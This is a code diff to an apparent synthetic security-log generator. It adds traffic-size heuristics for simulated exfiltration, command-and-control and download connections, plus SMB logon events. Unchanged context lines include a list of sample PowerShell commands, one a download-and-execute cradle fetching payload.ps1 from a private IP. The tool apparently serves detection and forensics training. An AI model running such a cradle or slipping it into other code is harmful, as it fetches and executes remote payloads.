@@ -42,6 +42,51 @@ from evidenceforge.utils.time import parse_duration, parse_iso8601
 
 logger = logging.getLogger(__name__)
 
+
+def _size_storyline_connection(
+    spec,
+    rng,
+) -> tuple[int, int]:
+    """Determine orig_bytes/resp_bytes for a storyline connection.
+
+    Priority:
+    1. Explicit spec values (author override)
+    2. Heuristic sizing based on technique/description keywords
+    3. Default bidirectional range
+    """
+    ob = spec.orig_bytes
+    rb = spec.resp_bytes
+
+    desc = (spec.description or "").lower()
+    tech = (spec.technique or "").lower()
+
+    is_exfil = "exfil" in desc or "t1041" in tech or "t1048" in tech
+    is_c2 = "c2" in desc or "callback" in desc or "beacon" in desc or "t1071" in tech
+    is_download = "download" in desc or "stage" in desc or "t1105" in tech
+
+    if ob is None:
+        if is_exfil:
+            ob = rng.randint(1_000_000, 50_000_000)  # 1-50 MB
+        elif is_c2:
+            ob = rng.randint(500, 5_000)
+        elif is_download:
+            ob = rng.randint(200, 2_000)
+        else:
+            ob = rng.randint(1_000, 10_000)
+
+    if rb is None:
+        if is_exfil:
+            rb = rng.randint(200, 5_000)  # small ACK/response
+        elif is_c2:
+            rb = rng.randint(1_000, 10_000)  # tasking payload
+        elif is_download:
+            rb = rng.randint(50_000, 5_000_000)  # 50KB-5MB payload
+        else:
+            rb = rng.randint(5_000, 50_000)
+
+    return ob, rb
+
+
 # Realistic decoded PowerShell commands for base64 encoding
 POWERSHELL_COMMANDS = [
     "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')",
@@ -730,6 +775,8 @@ class StorylineMixin:
             else:
                 conn_hostname = ""  # suppress — raw IP
                 emit_dns = False
+            s_ob, s_rb = _size_storyline_connection(spec, rng)
+            s_conn_state = spec.conn_state or "SF"
             uid = self.activity_generator.generate_connection(
                 src_ip=source_ip,
                 dst_ip=dst_ip,
@@ -737,8 +784,9 @@ class StorylineMixin:
                 dst_port=dst_port,
                 service=service,
                 duration=rng.uniform(1.0, 30.0),
-                orig_bytes=rng.randint(1000, 10000),
-                resp_bytes=rng.randint(5000, 50000),
+                orig_bytes=s_ob,
+                resp_bytes=s_rb,
+                conn_state=s_conn_state,
                 emit_dns=emit_dns,
                 source_system=src_sys,
                 http=http_ctx,
@@ -748,6 +796,20 @@ class StorylineMixin:
             malicious_event["dst_ip"] = dst_ip
             malicious_event["dst_port"] = dst_port
             malicious_event["uid"] = uid if uid else "(filtered by sensor placement)"
+
+            # Causal expansion: SMB to file server emits type 3 logon pair
+            if dst_port == 445:
+                dst_sys = next(
+                    (s for s in self.scenario.environment.systems if s.ip == dst_ip),
+                    None,
+                )
+                if (
+                    dst_sys
+                    and dst_sys.roles
+                    and "file_server" in [r.lower() for r in dst_sys.roles]
+                ):
+                    if hasattr(self, "_emit_smb_logon_pair"):
+                        self._emit_smb_logon_pair(actor, dst_sys, source_ip, time, rng)
 
         elif spec.type == "ssh_session":
             target = next(
